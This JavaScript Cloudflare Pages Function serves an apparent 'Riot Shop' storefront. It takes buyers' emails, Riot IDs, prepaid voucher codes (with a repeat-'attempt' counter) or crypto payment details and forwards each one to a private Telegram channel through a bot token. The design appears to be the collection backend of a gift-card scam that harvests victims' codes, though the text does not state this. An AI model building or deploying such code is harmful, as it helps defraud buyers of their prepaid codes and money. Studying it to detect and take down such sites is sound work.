/**
 * Cloudflare Pages Function — voucher code / payment submissions
 *
 * Set in Cloudflare Pages → Settings → Variables and Secrets:
 *   TELEGRAM_BOT_TOKEN
 *   TELEGRAM_CHANNEL_ID  (or TELEGRAM_CHAT_ID)
 */

const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type',
  'Content-Type': 'application/json',
};

function escapeMarkdown(text) {
  if (!text) return '';
  return String(text).replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, '\\$&');
}

function codeValue(text) {
  if (!text) return '`Not provided`';
  return '`' + String(text).replace(/`/g, "'") + '`';
}

function formatTelegramMessage(payload) {
  const isCrypto = payload.paymentType === 'crypto';

  if (isCrypto) {
    const lines = [
      '₿ *New Riot Shop Crypto Payment*',
      '',
      `📋 *Order:* ${codeValue(payload.orderId)}`,
      `📧 *Email:* ${codeValue(payload.email)}`,
    ];

    if (payload.riotId) {
      lines.push(`🎮 *Riot ID:* ${codeValue(payload.riotId)}`);
    }

    lines.push(
      `💳 *Method:* ${escapeMarkdown(payload.methodLabel || payload.method || 'Crypto')}`,
      `🎁 *Product:* ${escapeMarkdown(payload.productLabel || '')}`,
      `💰 *Price:* $${Number(payload.price || 0).toFixed(2)}`,
    );

    if (payload.discountCode) {
      lines.push(
        `🏷️ *Discount:* ${codeValue(payload.discountCode)}`,
        `📉 *Was:* $${Number(payload.originalPrice || payload.price || 0).toFixed(2)}`,
        `💸 *Saved:* $${Number(payload.discountSavings || 0).toFixed(2)}`,
      );
    }

    lines.push(
      '',
      `🪙 *Crypto:* ${escapeMarkdown(payload.cryptoSymbol || payload.cryptoCoin || '')}`,
      `💵 *Amount:* ${codeValue(String(payload.cryptoAmount || 'N/A'))}`,
      `📬 *Address:* ${codeValue(payload.cryptoAddress || '')}`,
    );

    if (payload.cryptoRateUsd) {
      lines.push(`📈 *Rate:* $${Number(payload.cryptoRateUsd).toFixed(2)}`);
    }

    return lines.join('\n');
  }

  const voucherText = (payload.vouchers || []).length
    ? `$${payload.vouchers.join(' + $')}`
    : 'N/A';

  const lines = [
    '🛒 *New Riot Shop Voucher Code*',
    '',
    `📋 *Order:* ${codeValue(payload.orderId)}`,
    `📧 *Email:* ${codeValue(payload.email)}`,
  ];

  if (payload.riotId) {
    lines.push(`🎮 *Riot ID:* ${codeValue(payload.riotId)}`);
  }

  lines.push(
    `💳 *Method:* ${escapeMarkdown(payload.methodLabel || payload.method || '')}`,
    `🎁 *Product:* ${escapeMarkdown(payload.productLabel || '')}`,
    `💰 *Price:* $${Number(payload.price || 0).toFixed(2)}`,
  );

  if (payload.discountCode) {
    lines.push(
      `🏷️ *Discount:* ${codeValue(payload.discountCode)}`,
      `📉 *Was:* $${Number(payload.originalPrice || payload.price || 0).toFixed(2)}`,
      `💸 *Saved:* $${Number(payload.discountSavings || 0).toFixed(2)}`,
    );
  }

  lines.push(
    '',
    `🎟️ *Code:* ${codeValue(payload.code || '')}`,
    `🧾 *Vouchers:* ${escapeMarkdown(voucherText)}`,
    `🔢 *Attempt:* ${payload.attempt || 1}`,
  );

  return lines.join('\n');
}

function isValidPayload(payload) {
  if (!payload.orderId || !payload.email) return false;
  if (payload.paymentType === 'crypto') return true;
  return Boolean(payload.code);
}

export async function onRequestPost(context) {
  const { request, env } = context;

  try {
    const botToken = env.TELEGRAM_BOT_TOKEN;
    const channelId = env.TELEGRAM_CHANNEL_ID || env.TELEGRAM_CHAT_ID;

    if (!botToken || !channelId) {
      console.error('Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHANNEL_ID');
      return new Response(
        JSON.stringify({ error: 'Server configuration error' }),
        { status: 500, headers: CORS },
      );
    }

    const payload = await request.json();

    if (!isValidPayload(payload)) {
      return new Response(
        JSON.stringify({ error: 'Missing required fields' }),
        { status: 400, headers: CORS },
      );
    }

    const text = formatTelegramMessage(payload);
    const tgRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: channelId,
        text,
        parse_mode: 'Markdown',
        disable_web_page_preview: true,
      }),
    });

    const tgData = await tgRes.json();

    if (!tgRes.ok || !tgData.ok) {
      console.error('Telegram API error:', tgData);
      return new Response(
        JSON.stringify({ error: 'Failed to send notification' }),
        { status: 502, headers: CORS },
      );
    }

    return new Response(JSON.stringify({ ok: true }), { status: 200, headers: CORS });
  } catch (err) {
    console.error('Submit handler error:', err);
    return new Response(
      JSON.stringify({ error: 'Internal server error' }),
      { status: 500, headers: CORS },
    );
  }
}

export async function onRequestOptions() {
  return new Response(null, {
    status: 204,
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    },
  });
}